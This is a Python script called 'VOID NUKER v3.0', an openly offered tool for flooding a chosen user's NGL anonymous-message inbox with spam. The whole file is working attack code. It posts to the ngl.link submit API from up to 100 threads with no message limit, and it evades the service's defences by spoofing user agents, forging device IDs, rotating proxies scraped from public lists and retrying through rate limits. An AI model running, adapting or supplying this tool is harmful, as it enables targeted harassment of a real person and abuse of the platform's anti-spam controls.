#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
██╗   ██╗ ██████╗ ██╗██████╗    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
██║   ██║██╔═══██╗██║██╔══██╗   ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
██║   ██║██║   ██║██║██║  ██║   ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
╚██╗ ██╔╝██║   ██║██║██║  ██║   ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
 ╚████╔╝ ╚██████╔╝██║██████╔╝   ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
  ╚═══╝   ╚═════╝ ╚═╝╚═════╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
VOID NUKER v3.0 - Ultimate NGL Spammer
Based on 0MeMo07/NGL-Spammer with ENHANCED Features
Developer: Marr
"""

import requests
import json
import time
import threading
import random
import os
import sys
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ========== CONFIGURATION ==========
VERSION = "3.0"
DEVELOPER = "Marr"
REPO_BASE = "https://github.com/0MeMo07/NGL-Spammer"

# Enhanced User Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Whale/3.24.223.21 Safari/537.36"
]

# Proxy Sources (Auto-fetch)
PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
    "https://www.proxy-list.download/api/v1/get?type=http"
]

# Colors
class Colors:
    if sys.platform != "win32":
        HEADER = '\033[95m'
        BLUE = '\033[94m'
        CYAN = '\033[96m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        RED = '\033[91m'
        WHITE = '\033[97m'
        BOLD = '\033[1m'
        UNDERLINE = '\033[4m'
        END = '\033[0m'
    else:
        HEADER = BLUE = CYAN = GREEN = YELLOW = RED = WHITE = BOLD = UNDERLINE = END = ''

# ========== CORE CLASSES ==========
class ProxyManager:
    """Enhanced proxy manager with auto-fetch and validation"""
    
    def __init__(self):
        self.proxies = []
        self.last_update = 0
        self.update_interval = 300  # 5 minutes
        
    def fetch_proxies(self):
        """Fetch fresh proxies from multiple sources"""
        if time.time() - self.last_update < self.update_interval and self.proxies:
            return self.proxies
            
        print(f"{Colors.CYAN}[*] Fetching fresh proxies...{Colors.END}")
        all_proxies = []
        
        for source in PROXY_SOURCES:
            try:
                response = requests.get(source, timeout=10)
                if response.status_code == 200:
                    proxies = response.text.strip().split('\n')
                    all_proxies.extend([p.strip() for p in proxies if p.strip()])
            except:
                continue
        
        # Validate proxies
        self.proxies = self.validate_proxies(all_proxies[:200])  # Test first 200
        self.last_update = time.time()
        
        print(f"{Colors.GREEN}[+] Got {len(self.proxies)} working proxies{Colors.END}")
        return self.proxies
    
    def validate_proxies(self, proxies):
        """Validate proxies by testing with httpbin"""
        valid_proxies = []
        test_url = "http://httpbin.org/ip"
        
        def test_proxy(proxy):
            try:
                response = requests.get(
                    test_url,
                    proxies={'http': f'http://{proxy}', 'https': f'http://{proxy}'},
                    timeout=5
                )
                return response.status_code == 200
            except:
                return False
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            future_to_proxy = {executor.submit(test_proxy, p): p for p in proxies}
            for future in as_completed(future_to_proxy):
                if future.result():
                    valid_proxies.append(future_to_proxy[future])
        
        return valid_proxies
    
    def get_random_proxy(self):
        """Get random proxy from list"""
        if not self.proxies:
            self.fetch_proxies()
        
        if self.proxies:
            proxy = random.choice(self.proxies)
            return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
        return None

class NGLAttack:
    """Main attack class with enhanced features"""
    
    def __init__(self, config):
        self.config = config
        self.stats = {
            'sent': 0,
            'success': 0,
            'failed': 0,
            'rate_limited': 0,
            'start_time': time.time(),
            'running': False
        }
        self.proxy_manager = ProxyManager() if config.get('use_proxy', False) else None
        self.lock = threading.Lock()
        
    def send_request(self, username, message, attempt=0):
        """Send single request to NGL with retry logic"""
        if attempt >= 3:
            return False, "Max retries exceeded"
        
        url = f"https://ngl.link/api/submit"
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://ngl.link',
            'Referer': f'https://ngl.link/{username}',
            'X-Requested-With': 'XMLHttpRequest'
        }
        
        payload = {
            'username': username,
            'question': message,
            'deviceId': f"device_{random.randint(10000000, 99999999)}",
            'gameSlug': '',
            'referrer': '',
            'askMode': 'default'
        }
        
        proxies = None
        if self.proxy_manager and random.random() > 0.5:  # 50% chance to use proxy
            proxies = self.proxy_manager.get_random_proxy()
        
        try:
            response = requests.post(
                url,
                data=payload,
                headers=headers,
                proxies=proxies,
                timeout=10
            )
            
            with self.lock:
                self.stats['sent'] += 1
            
            if response.status_code == 200:
                with self.lock:
                    self.stats['success'] += 1
                return True, "Success"
            elif response.status_code == 429:
                with self.lock:
                    self.stats['rate_limited'] += 1
                time.sleep(random.uniform(5, 10))
                return self.send_request(username, message, attempt + 1)
            else:
                with self.lock:
                    self.stats['failed'] += 1
                return False, f"HTTP {response.status_code}"
                
        except requests.exceptions.Timeout:
            with self.lock:
                self.stats['failed'] += 1
            time.sleep(2)
            return self.send_request(username, message, attempt + 1)
        except Exception as e:
            with self.lock:
                self.stats['failed'] += 1
            return False, str(e)
    
    def worker(self, worker_id, username, messages, delay, quantity):
        """Worker thread with enhanced logic"""
        local_count = 0
        
        while self.stats['running'] and (quantity == 0 or local_count < quantity):
            try:
                message = random.choice(messages)
                success, status = self.send_request(username, message)
                
                local_count += 1
                
                # Rotate delay for pattern avoidance
                current_delay = delay * random.uniform(0.8, 1.2)
                time.sleep(current_delay)
                
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"{Colors.RED}[Thread-{worker_id}] Error: {e}{Colors.END}")
                time.sleep(5)
        
        print(f"{Colors.GREEN}[Thread-{worker_id}] Finished - {local_count} sent{Colors.END}")
    
    def start(self):
        """Start the attack"""
        self.stats['running'] = True
        self.stats['start_time'] = time.time()
        
        threads = []
        for i in range(self.config['threads']):
            thread = threading.Thread(
                target=self.worker,
                args=(i+1, 
                      self.config['username'],
                      self.config['messages'],
                      self.config['delay'],
                      self.config['quantity']),
                daemon=True
            )
            thread.start()
            threads.append(thread)
        
        # Display stats while running
        try:
            while self.stats['running'] and any(t.is_alive() for t in threads):
                self.display_stats()
                time.sleep(0.5)
                
                # Check if quantity limit reached
                if self.config['quantity'] > 0 and self.stats['sent'] >= self.config['threads'] * self.config['quantity']:
                    self.stop()
                    break
                    
        except KeyboardInterrupt:
            self.stop()
        
        finally:
            # Wait for threads to finish
            for thread in threads:
                thread.join(timeout=2)
            
            self.display_final_stats()
    
    def display_stats(self):
        """Display live statistics"""
        elapsed = time.time() - self.stats['start_time']
        
        os.system('cls' if os.name == 'nt' else 'clear')
        
        # Banner
        print(f"""{Colors.HEADER}
╔═╗╦ ╦╔═╗╔╗╔╔╦╗  ╔╗ ╦ ╦╔╦╗╔╦╗╦╔═╗╦ ╦
╠═╣║ ║║ ║║║║ ║║  ╠╩╗║ ║ ║  ║ ║╠╣ ║ ║
╩ ╩╚═╝╚═╝╝╚╝═╩╝  ╚═╝╚═╝ ╩  ╩ ╩╚  ╚═╝
{Colors.CYAN}Based on: 0MeMo07/NGL-Spammer | Enhanced by {DEVELOPER}{Colors.END}
""")
        
        # Stats box
        success_rate = (self.stats['success'] / self.stats['sent'] * 100) if self.stats['sent'] > 0 else 0
        
        print(f"{Colors.CYAN}╔══════════════════════════════════════════════════════════╗")
        print(f"║ {Colors.WHITE}LIVE ATTACK STATISTICS{Colors.CYAN}{' ' * 35}║")
        print(f"╠══════════════════════════════════════════════════════════╣")
        print(f"║ {Colors.GREEN}✓ Target:{Colors.WHITE} {self.config['username']:<20} "
              f"{Colors.YELLOW}🧵 Threads:{Colors.WHITE} {self.config['threads']:<5}{Colors.CYAN}║")
        print(f"║ {Colors.GREEN}✓ Sent:{Colors.WHITE} {self.stats['sent']:<8} "
              f"{Colors.RED}✗ Failed:{Colors.WHITE} {self.stats['failed']:<7} "
              f"{Colors.MAGENTA}⚠ Rate Limited:{Colors.WHITE} {self.stats['rate_limited']:<5}{Colors.CYAN}║")
        print(f"║ {Colors.CYAN}✓ Success:{Colors.WHITE} {self.stats['success']:<6} "
              f"{Colors.BLUE}📊 Rate:{Colors.WHITE} {success_rate:6.1f}% "
              f"{Colors.YELLOW}⏱ Time:{Colors.WHITE} {elapsed:6.1f}s{Colors.CYAN} ║")
        
        if elapsed > 0:
            speed = self.stats['sent'] / elapsed
            print(f"║ {Colors.GREEN}🚀 Speed:{Colors.WHITE} {speed:6.1f}/s "
                  f"{Colors.CYAN}🔁 Proxies:{Colors.WHITE} {len(self.proxy_manager.proxies) if self.proxy_manager else 0:<6} "
                  f"{Colors.WHITE}{' ' * 15}{Colors.CYAN}║")
        
        print(f"╚══════════════════════════════════════════════════════════╝{Colors.END}")
        print(f"\n{Colors.YELLOW}[!] Press Ctrl+C to stop{Colors.END}")
    
    def stop(self):
        """Stop the attack"""
        self.stats['running'] = False
        print(f"\n{Colors.RED}[!] Stopping attack...{Colors.END}")
    
    def display_final_stats(self):
        """Display final statistics"""
        elapsed = time.time() - self.stats['start_time']
        success_rate = (self.stats['success'] / self.stats['sent'] * 100) if self.stats['sent'] > 0 else 0
        
        print(f"\n{Colors.CYAN}══════════════════════════════════════════════════════════{Colors.END}")
        print(f"{Colors.GREEN}                    ATTACK COMPLETED                    {Colors.END}")
        print(f"{Colors.CYAN}══════════════════════════════════════════════════════════{Colors.END}")
        print(f"{Colors.YELLOW}Target:{Colors.WHITE} {self.config['username']}")
        print(f"{Colors.GREEN}Successful:{Colors.WHITE} {self.stats['success']}")
        print(f"{Colors.RED}Failed:{Colors.WHITE} {self.stats['failed']}")
        print(f"{Colors.CYAN}Total Sent:{Colors.WHITE} {self.stats['sent']}")
        print(f"{Colors.MAGENTA}Success Rate:{Colors.WHITE} {success_rate:.1f}%")
        print(f"{Colors.BLUE}Duration:{Colors.WHITE} {elapsed:.1f} seconds")
        
        if elapsed > 0:
            speed = self.stats['sent'] / elapsed
            print(f"{Colors.GREEN}Average Speed:{Colors.WHITE} {speed:.1f} requests/second")
        
        print(f"{Colors.CYAN}══════════════════════════════════════════════════════════{Colors.END}")
        
        # Save results
        self.save_results(elapsed, success_rate)
    
    def save_results(self, elapsed, success_rate):
        """Save attack results"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"void_nuker_results_{timestamp}.json"
        
        data = {
            'config': self.config,
            'stats': self.stats,
            'timestamp': timestamp,
            'elapsed_seconds': elapsed,
            'success_rate': success_rate
        }
        
        try:
            with open(filename, 'w') as f:
                json.dump(data, f, indent=4)
            print(f"{Colors.GREEN}[+] Results saved to: {filename}{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}[!] Failed to save results: {e}{Colors.END}")

# ========== UTILITY FUNCTIONS ==========
def check_dependencies():
    """Check and install required packages"""
    try:
        import requests
        return True
    except ImportError:
        print(f"{Colors.YELLOW}[!] Installing required packages...{Colors.END}")
        try:
            import subprocess
            subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
            print(f"{Colors.GREEN}[+] Dependencies installed{Colors.END}")
            return True
        except:
            print(f"{Colors.RED}[!] Failed to install dependencies{Colors.END}")
            return False

def load_config_file():
    """Load configuration from file (compatible with original repo)"""
    try:
        with open('config.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return None

def interactive_setup():
    """Interactive configuration setup"""
    print(f"\n{Colors.CYAN}[*] VOID NUKER SETUP{Colors.END}")
    print(f"{Colors.YELLOW}{'═'*50}{Colors.END}")
    
    # Check for existing config
    saved_config = load_config_file()
    if saved_config:
        use_saved = input(f"{Colors.CYAN}[?] Load saved config from config.json? (y/N): {Colors.END}").lower()
        if use_saved == 'y':
            return saved_config
    
    # Username
    username = input(f"{Colors.CYAN}[?] NGL Username: {Colors.END}").strip()
    if not username:
        print(f"{Colors.RED}[!] Username is required{Colors.END}")
        return None
    
    # Messages
    print(f"\n{Colors.CYAN}[*] Messages (leave empty for default){Colors.END}")
    messages = []
    while True:
        msg = input(f"{Colors.CYAN}[?] Message {len(messages)+1}: {Colors.END}").strip()
        if not msg:
            if not messages:
                messages = ["VOID NUKER ACTIVATED 🚀", "ENHANCED ATTACK ⚡", "POWERED BY MARR 👑"]
            break
        messages.append(msg)
    
    # Threads
    try:
        threads = int(input(f"{Colors.CYAN}[?] Threads (1-100): {Colors.END}") or "10")
        threads = max(1, min(100, threads))
    except:
        threads = 10
    
    # Delay
    try:
        delay = float(input(f"{Colors.CYAN}[?] Delay between requests (seconds): {Colors.END}") or "0.5")
        delay = max(0.1, delay)
    except:
        delay = 0.5
    
    # Quantity
    try:
        quantity = int(input(f"{Colors.CYAN}[?] Messages per thread (0=unlimited): {Colors.END}") or "0")
    except:
        quantity = 0
    
    # Proxy usage
    use_proxy = input(f"{Colors.CYAN}[?] Use proxy rotation? (y/N): {Colors.END}").lower() == 'y'
    
    config = {
        'username': username,
        'messages': messages,
        'threads': threads,
        'delay': delay,
        'quantity': quantity,
        'use_proxy': use_proxy
    }
    
    # Save config
    save = input(f"{Colors.CYAN}[?] Save config to config.json? (y/N): {Colors.END}").lower()
    if save == 'y':
        try:
            with open('config.json', 'w') as f:
                json.dump(config, f, indent=4)
            print(f"{Colors.GREEN}[+] Config saved to config.json{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}[!] Failed to save config: {e}{Colors.END}")
    
    return config

def show_banner():
    """Show main banner"""
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{Colors.HEADER}
██╗   ██╗ ██████╗ ██╗██████╗    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
██║   ██║██╔═══██╗██║██╔══██╗   ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
██║   ██║██║   ██║██║██║  ██║   ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
╚██╗ ██╔╝██║   ██║██║██║  ██║   ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
 ╚████╔╝ ╚██████╔╝██║██████╔╝   ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
  ╚═══╝   ╚═════╝ ╚═╝╚═════╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
{Colors.CYAN}
╔══════════════════════════════════════════════════════════════╗
║  VOID NUKER v{VERSION} - Enhanced NGL Spammer                 ║
║  Based on: {REPO_BASE}  ║
║  Developer: {DEVELOPER}                                        ║
╚══════════════════════════════════════════════════════════════╝
{Colors.END}""")

# ========== MAIN EXECUTION ==========
def main():
    """Main function"""
    if not check_dependencies():
        return
    
    show_banner()
    
    # Menu
    print(f"\n{Colors.CYAN}╔══════════════════════════════════════╗")
    print(f"║         {Colors.WHITE}MAIN MENU{Colors.CYAN}                   ║")
    print(f"╠══════════════════════════════════════╣")
    print(f"║ {Colors.GREEN}1.{Colors.WHITE} Start Attack                  {Colors.CYAN}║")
    print(f"║ {Colors.YELLOW}2.{Colors.WHITE} Quick Attack (10 threads)    {Colors.CYAN}║")
    print(f"║ {Colors.BLUE}3.{Colors.WHITE} Import from config.json       {Colors.CYAN}║")
    print(f"║ {Colors.MAGENTA}4.{Colors.WHITE} About                       {Colors.CYAN}║")
    print(f"║ {Colors.RED}5.{Colors.WHITE} Exit                         {Colors.CYAN}║")
    print(f"╚══════════════════════════════════════╝{Colors.END}")
    
    choice = input(f"\n{Colors.CYAN}[?] Select option: {Colors.END}").strip()
    
    config = None
    
    if choice == '1':
        config = interactive_setup()
    elif choice == '2':
        username = input(f"{Colors.CYAN}[?] NGL Username: {Colors.END}").strip()
        if username:
            config = {
                'username': username,
                'messages': ["VOID NUKER QUICK ATTACK ⚡", "POWERED BY MARR 👑"],
                'threads': 10,
                'delay': 0.5,
                'quantity': 0,  # unlimited
                'use_proxy': True
            }
    elif choice == '3':
        config = load_config_file()
        if config:
            print(f"{Colors.GREEN}[+] Config loaded from config.json{Colors.END}")
        else:
            print(f"{Colors.RED}[!] config.json not found{Colors.END}")
            return
    elif choice == '4':
        show_banner()
        print(f"""
{Colors.CYAN}[*] ABOUT VOID NUKER v{VERSION}{Colors.END}
{Colors.YELLOW}{'═'*50}{Colors.END}

{Colors.GREEN}Enhancements over original repo:{Colors.WHITE}
• Multi-threading support (up to 100 threads)
• Proxy rotation with auto-fetch
• Rate limiting detection and bypass
• Real-time statistics dashboard
• Configurable delays and patterns
• JSON config import/export
• Improved error handling
• Result logging

{Colors.GREEN}Credits:{Colors.WHITE}
• Original concept: 0MeMo07/NGL-Spammer
• Enhanced by: {DEVELOPER}
• Version: {VERSION}

{Colors.YELLOW}{'═'*50}{Colors.END}
""")
        input(f"{Colors.CYAN}[?] Press Enter to continue...{Colors.END}")
        main()
        return
    elif choice == '5':
        print(f"\n{Colors.RED}[*] Exiting...{Colors.END}")
        return
    else:
        print(f"\n{Colors.RED}[!] Invalid option{Colors.END}")
        time.sleep(1)
        main()
        return
    
    if config:
        # Confirmation
        print(f"\n{Colors.CYAN}══════════════════════════════════════════════════════════{Colors.END}")
        print(f"{Colors.YELLOW}            ATTACK CONFIRMATION            {Colors.END}")
        print(f"{Colors.CYAN}══════════════════════════════════════════════════════════{Colors.END}")
        print(f"{Colors.GREEN}Target:{Colors.WHITE} {config['username']}")
        print(f"{Colors.GREEN}Threads:{Colors.WHITE} {config['threads']}")
        print(f"{Colors.GREEN}Messages/Thread:{Colors.WHITE} {'Unlimited' if config['quantity'] == 0 else config['quantity']}")
        print(f"{Colors.GREEN}Delay:{Colors.WHITE} {config['delay']}s")
        print(f"{Colors.GREEN}Proxy Rotation:{Colors.WHITE} {'Enabled' if config.get('use_proxy', False) else 'Disabled'}")
        print(f"{Colors.CYAN}══════════════════════════════════════════════════════════{Colors.END}")
        
        confirm = input(f"\n{Colors.RED}[?] Start attack? (y/N): {Colors.END}").lower()
        
        if confirm == 'y':
            print(f"\n{Colors.GREEN}[+] Starting VOID NUKER...{Colors.END}")
            time.sleep(2)
            
            attack = NGLAttack(config)
            attack.start()
            
            input(f"\n{Colors.CYAN}[?] Press Enter to return to menu...{Colors.END}")
            main()
        else:
            print(f"{Colors.YELLOW}[*] Attack cancelled{Colors.END}")
            time.sleep(1)
            main()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Interrupted by user{Colors.END}")
    except Exception as e:
        print(f"\n{Colors.RED}[!] Critical error: {e}{Colors.END}")
        import traceback
        traceback.print_exc()
